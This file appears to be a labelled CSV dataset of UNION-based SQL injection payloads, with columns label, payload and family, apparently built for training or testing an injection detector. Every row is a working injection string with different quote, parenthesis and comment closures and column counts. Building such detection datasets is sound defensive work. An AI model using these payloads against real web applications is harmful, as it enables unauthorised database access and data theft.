label,payload,family
attack,"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",union
attack,"1%'  )   union all select null,null--",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",union
attack,"-2434  )   union all select 8310,8310,8310,8310,8310--",union
attack,"1"" where 1452  =  1452 union all select null,null,null,null--",union
attack,-2393%'   )    )    union all select 2772--,union
attack,"1' where 3700  =  3700 union all select null,null,null--",union
attack,"-7142'   )    )    union all select 5083,5083,5083,5083#",union
attack,"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",union
attack,"-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",union
attack,"1""  )   as drrx where 8633  =  8633 union all select null,null,null--",union
attack,"-2333' union all select 9714,9714,9714--",union
attack,"1""   )    )     )   union all select null,null--",union
attack,"-9247'   )    )     )   union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--",union
attack,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null#",union
attack,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",union
attack,"1   )    )    union all select null,null,null,null,null--",union
attack,"1  )   where 5336  =  5336 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",union
attack,-1087  )   where 5787  =  5787 union all select 5787#,union
attack,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",union
attack,"1   )    )    union all select null,null,null,null,null,null,null#",union
attack,"-4280%""   )    )     )   union all select 7981,7981--",union
attack,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",union
attack,"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",union
attack,"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",union
attack,"1'  )   union all select null,null,null,null,null#",union
attack,"1%'   )    )    union all select null,null,null,null,null,null--",union
attack,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",union
attack,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",union
attack,"1%' union all select null,null,null,null,null,null#",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",union
attack,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",union
attack,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",union
attack,"-7069  )   union all select 6638,6638,6638,6638,6638,6638--",union
attack,"1%""   )    )     )   union all select null,null,null,null#",union
attack,"-5802'   )    )     )   union all select 6286,6286,6286,6286#",union
attack,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",union
attack,"1%""   )    )    union all select null,null,null,null,null#",union
attack,"1   )    )    as nnpe where 9720  =  9720 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1 where 4448  =  4448 union all select null,null,null,null,null#",union
attack,"-1868   )    )    union all select 1859,1859--",union
attack,"1%"" union all select null#",union
attack,"-5150   )    )     )   union all select 5660,5660,5660#",union
attack,"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",union
attack,-7034'   )    )     )   union all select 4023#,union
attack,"-4287%""   )    )    union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",union
attack,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",union
attack,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",union
attack,"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",union
attack,"1'   )    )     )   union all select null,null,null--",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"-7714 where 9768  =  9768 union all select 9768,9768--",union
attack,"-3433'  )   where 8307  =  8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--",union
attack,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null--",union
attack,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",union
attack,"1""   )    )     )   union all select null,null,null,null#",union
attack,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",union
attack,"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",union
attack,"-2639""  )   where 1494  =  1494 union all select 1494--",union
attack,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",union
attack,-4058  )   union all select 9184--,union
attack,"1'  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"1'   )    )    union all select null,null#",union
attack,1%'  )   union all select null#,union
attack,"1'  )   union all select null,null,null,null#",union
attack,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",union
attack,"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",union
attack,"-3177'   )    )    union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",union
attack,"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",union
attack,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",union
attack,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",union
attack,"1' in boolean mode  )   union all select null,null,null,null--",union
attack,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",union
attack,"-4068'   )    )     )   union all select 9491,9491,9491--",union
attack,"1%""   )    )     )   union all select null,null,null--",union
attack,"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",union
attack,"1  )   where 4810  =  4810 union all select null,null#",union
attack,"-4100'   )    )    union all select 1163,1163,1163--",union
attack,"-6000""  )   where 1797  =  1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",union
attack,"1' union all select null,null,null,null,null,null#",union
attack,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",union
attack,"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",union
attack,"-8707'  )   union all select 5609,5609,5609--",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null#",union
attack,"1%'   )    )    union all select null,null,null#",union
attack,"-6108'  )   union all select 2519,2519,2519,2519--",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",union
attack,-4583'  )   as evbo where 6055  =  6055 union all select 6055--,union
attack,"-3126   )    )    union all select 6718,6718,6718,6718,6718--",union
attack,"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",union
attack,"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",union
attack,"-1869""   )    )     )   union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",union
attack,"-2605%'   )    )     )   union all select 4738,4738#",union
attack,"1' union all select null,null,null,null,null,null,null--",union
attack,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",union
attack,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",union
attack,"-9037%"" union all select 6583#",union
attack,"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",union
attack,"1%' union all select null,null,null--",union
attack,"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#",union
attack,-1876%'  )   union all select 6463--,union
attack,-1908'   )    )     )   union all select 7665#,union
attack,"-6659'  )   where 1256  =  1256 union all select 1256,1256--",union
attack,"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",union
attack,"-2667  )   union all select 5848,5848,5848,5848--",union
attack,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,union
attack,1   )    )    as kccx where 7547  =  7547 union all select null--,union
attack,"1%""  )   union all select null,null#",union
attack,"1   )    )     )   union all select null,null#",union
attack,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-4182   )    )    as wkfh where 6145  =  6145 union all select 6145,6145,6145,6145,6145#",union
attack,"-9606%""   )    )     )   union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",union
attack,"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",union
attack,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",union
attack,"1   )    )    union all select null,null#",union
attack,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",union
attack,"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",union
attack,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",union
attack,"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",union
attack,-9841 where 4612  =  4612 union all select 4612--,union
attack,"1%""  )   union all select null,null,null,null,null--",union
attack,"-2821""   )    )     )   union all select 3920,3920,3920,3920,3920,3920,3920#",union
attack,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",union
attack,"1  )   as asmt where 4986  =  4986 union all select null,null#",union
attack,"1""   )    )     )   union all select null,null,null,null--",union
attack,"1' in boolean mode  )   union all select null,null#",union
attack,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",union
attack,"1 where 6412  =  6412 union all select null,null,null,null,null,null,null--",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"1'||  (  select 'tmsj' where 2971  =  2971 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",union
attack,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",union
attack,"-8772%""  )   union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",union
attack,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",union
attack,"1'   )    )    as mjps where 2179  =  2179 union all select null,null,null,null,null,null,null--",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%""   )    )     )   union all select null,null,null,null,null--",union
attack,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",union
attack,1 where 7516  =  7516 union all select null#,union
attack,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",union
attack,"-1079""  )   where 2865  =  2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",union
attack,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",union
attack,1%'   )    )     )   union all select null--,union
attack,"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--",union
attack,"1   )    )    as hpxw where 1826  =  1826 union all select null,null,null,null,null,null,null,null#",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null--",union
attack,-3666'  )   where 6386  =  6386 union all select 6386--,union
attack,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",union
attack,"1  )   as ujjg where 3125  =  3125 union all select null,null,null,null,null,null#",union
attack,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",union
attack,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",union
attack,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",union
attack,"1  )   union all select null,null,null--",union
attack,"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1""   )    )    as tngu where 3644  =  3644 union all select null--",union
attack,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null--",union
attack,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",union
attack,"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",union
attack,"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",union
attack,"-5731"" union all select 3083,3083,3083#",union
attack,"-9932"" union all select 4049,4049,4049--",union
attack,"1"" union all select null,null,null,null,null,null,null,null,null#",union
attack,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",union
attack,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",union
attack,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",union
attack,"1""  )   as ivkw where 4218  =  4218 union all select null--",union
attack,"1""  )   where 2088  =  2088 union all select null,null,null,null--",union
attack,"-2230%"" union all select 3303,3303,3303--",union
attack,"1""   )    )    as xhat where 6674  =  6674 union all select null,null,null#",union
attack,"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1%' union all select null,null--",union
attack,"1%' union all select null,null,null,null,null,null--",union
attack,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",union
attack,"-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#",union
attack,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1%""   )    )     )   union all select null,null,null,null,null#",union
attack,"1""  )   where 5794  =  5794 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#",union
attack,"-7544""   )    )    union all select 3808,3808,3808,3808--",union
attack,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",union
attack,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",union
attack,"1""  )   union all select null,null--",union
attack,"1 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1'+  (  select lang where 4191  =  4191 union all select null,null#",union
attack,1%'   )    )    union all select null--,union
attack,"1   )    )    union all select null,null,null,null,null,null#",union
attack,"-1015""   )    )    union all select 6624,6624#",union
attack,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null,null--",union
attack,"-5691' union all select 6610,6610#",union
attack,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",union
attack,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",union
attack,"1' where 6721  =  6721 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-6086"" union all select 8700,8700,8700,8700--",union
attack,"1 where 2292  =  2292 union all select null,null,null,null#",union
attack,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",union
attack,"1"" where 1203  =  1203 union all select null,null,null--",union
attack,"-2384%'   )    )    union all select 2467,2467,2467,2467#",union
attack,"1""   )    )    union all select null,null,null,null,null#",union
attack,"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",union
attack,"1' in boolean mode  )   union all select null,null,null,null#",union
attack,"-1559 union all select 3985,3985,3985,3985#",union
attack,"-5934' union all select 6096,6096,6096,6096,6096#",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"1' union all select null,null,null,null,null,null,null,null,null--",union
attack,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",union
attack,"1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#",union
attack,-6109 union all select 6784--,union
attack,"1'   )    )    union all select null,null,null,null,null#",union
attack,"1""  )   as boeh where 2571  =  2571 union all select null#",union
attack,"1'  )   union all select null,null,null,null,null,null,null,null#",union
attack,"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",union
attack,"-4865 where 1386  =  1386 union all select 1386,1386,1386,1386#",union
attack,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",union
attack,"1""  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--",union
attack,-1492 where 2788  =  2788 union all select 2788#,union
attack,"-3283  )   where 1948  =  1948 union all select 1948,1948,1948#",union
attack,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",union
attack,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",union
attack,"-7941%'  )   union all select 6965,6965,6965,6965--",union
attack,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",union
attack,"1' union all select null,null,null,null,null,null,null,null--",union
attack,"-1033 union all select 8731,8731,8731,8731,8731,8731--",union
attack,-4572'  )   union all select 3520--,union
attack,"-9227  )   where 6723  =  6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",union
attack,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",union
attack,"1%'  )   union all select null,null,null#",union
attack,"1""   )    )     )   union all select null,null,null#",union
attack,"-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",union
attack,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",union
attack,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",union
attack,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",union
attack,"1""  )   as xsgx where 5239  =  5239 union all select null,null--",union
attack,"1' union all select null,null,null,null,null,null--",union
attack,"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",union
attack,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",union
attack,"1""  )   as ckoi where 4674  =  4674 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",union
attack,"1""  )   union all select null,null,null,null,null,null,null,null#",union
attack,"-6600'  )   union all select 5566,5566#",union
attack,"-1287""  )   as bbzg where 1475  =  1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",union
attack,"1 where 4331  =  4331 union all select null,null,null,null,null,null#",union
attack,1  )   where 5418  =  5418 union all select null--,union
attack,"1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#",union
attack,"-5732'  )   union all select 7614,7614,7614,7614--",union
attack,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",union
attack,"-9197%""   )    )     )   union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",union
attack,"-8684 union all select 9519,9519,9519,9519--",union
attack,"-9588'   )    )    union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--",union
attack,"-3781  )   union all select 3916,3916,3916--",union
attack,"-5849  )   union all select 6168,6168,6168,6168,6168,6168,6168,6168#",union
attack,"1""   )    )    union all select null,null,null,null,null,null--",union
attack,"1'  )   as ildf where 5545  =  5545 union all select null,null,null,null#",union
attack,"-3955 where 7276  =  7276 union all select 7276,7276,7276,7276,7276,7276,7276,7276,7276--",union
attack,"1""  )   union all select null,null,null,null,null#",union
attack,"-5826""   )    )    union all select 7192,7192#",union
attack,"-9959""  )   where 7073  =  7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",union
attack,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",union
attack,"1"" union all select null,null,null,null,null,null,null,null,null--",union
attack,"1%""  )   union all select null,null,null,null,null#",union
attack,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"-2247'  )   union all select 1202,1202,1202,1202,1202#",union
attack,1'   )    )     )   union all select null--,union
attack,"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",union
attack,"-1303' union all select 4840,4840#",union
attack,"-8203""  )   union all select 6394,6394,6394,6394,6394--",union
attack,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",union
attack,"-3865""  )   where 3559  =  3559 union all select 3559,3559,3559,3559,3559,3559,3559--",union
attack,1%'  )   union all select null--,union
attack,"-6527'   )    )    union all select 5053,5053,5053,5053--",union
attack,1'   )    )    union all select null--,union
attack,"1"" union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",union
attack,"-7916'   )    )    union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",union
attack,"1'||  (  select 'fdkl' where 4572  =  4572 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1' where 2391  =  2391 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1' union all select null,null,null,null,null#",union
attack,"1%""   )    )    union all select null#",union
attack,"1%'  )   union all select null,null,null,null,null,null,null,null--",union
attack,"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",union
attack,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",union
attack,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",union
attack,"-2643%"" union all select 7779,7779--",union
attack,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",union
attack,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",union
attack,"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",union
attack,"1""   )    )    union all select null,null,null,null#",union
attack,"-2359' union all select 2687,2687,2687#",union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null#",union
attack,"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",union
attack,"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",union
attack,-6567'   )    )    union all select 3217#,union
attack,"1'  )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"-8042  )   as zhoq where 2120  =  2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",union
attack,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",union
attack,"-2046'  )   union all select 6668,6668--",union
attack,"-3151%""   )    )     )   union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",union
attack,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",union
attack,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",union
attack,"1%'   )    )    union all select null,null,null,null,null,null#",union
attack,"1  )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-3872%""   )    )     )   union all select 1637,1637,1637,1637,1637#",union
attack,"1'+  (  select 'vabj' where 7178  =  7178 union all select null,null,null,null,null#",union
attack,"1"" where 4684  =  4684 union all select null,null,null,null#",union
attack,"1"" union all select null,null,null,null,null,null#",union
attack,1' union all select null--,union
attack,-1641' union all select 4835#,union
attack,"-1432""   )    )    union all select 9008,9008,9008#",union
attack,"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",union
attack,"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null,null#",union
attack,"-8331'  )   union all select 1452,1452,1452,1452,1452--",union
attack,"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",union
attack,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",union
attack,1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,union
attack,"-8735'   )    )    union all select 3262,3262,3262--",union
attack,"-4248""   )    )    union all select 9450,9450,9450--",union
attack,"-5245""   )    )     )   union all select 8106,8106,8106#",union
attack,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",union
attack,"-1040 where 3058  =  3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",union
attack,"-9405'  )   union all select 8283,8283,8283,8283--",union
attack,"-7868"" union all select 1805--",union
attack,"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",union
attack,"1%'   )    )    union all select null,null,null--",union
attack,"-2862'   )    )     )   union all select 6649,6649--",union
attack,"-9583'   )    )    union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",union
attack,"-5322"" union all select 6494,6494,6494,6494,6494,6494--",union
attack,"-3102  )   union all select 6707,6707,6707,6707--",union
attack,1 union all select null--,union
attack,1' where 8159  =  8159 union all select null#,union
attack,"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",union
attack,"1""   )    )     )   union all select null,null#",union
attack,"-1055' union all select 7758,7758,7758,7758,7758,7758--",union
attack,"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",union
attack,"1' where 8451  =  8451 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%"" union all select null,null,null,null,null,null#",union
attack,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",union
attack,"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",union
attack,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",union
attack,1   )    )    union all select null#,union
attack,"-4955%' union all select 5928,5928--",union
attack,"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",union
attack,"1'  )   union all select null,null,null,null,null--",union
attack,"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",union
attack,"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",union
attack,"1""  )   union all select null,null,null,null,null,null,null#",union
attack,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null#",union
attack,"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",union
attack,"-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--",union
attack,"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",union
attack,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",union
attack,"1'   )    )    union all select null,null,null,null,null,null,null,null--",union
attack,"1%""  )   union all select null,null,null,null,null,null,null,null--",union
attack,-7345  )   union all select 3866#,union
attack,"1   )    )     )   union all select null,null,null,null,null,null,null,null#",union
attack,"-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",union
attack,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",union
attack,"-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",union
attack,"-4406%' union all select 9599,9599,9599,9599#",union
attack,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",union
attack,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",union
attack,"1'   )    )    union all select null,null,null,null,null,null,null#",union
attack,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",union
attack,"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",union
attack,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",union
attack,1%' union all select null--,union
attack,"-3667%'   )    )    union all select 3560,3560,3560--",union
attack,-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,union
attack,"1%"" union all select null,null,null,null,null,null,null,null,null--",union
attack,"-4915' union all select 1928,1928,1928,1928#",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",union
attack,-3988'   )    )    union all select 1113#,union
attack,"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#",union
attack,"1 union all select null,null--",union
attack,"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",union
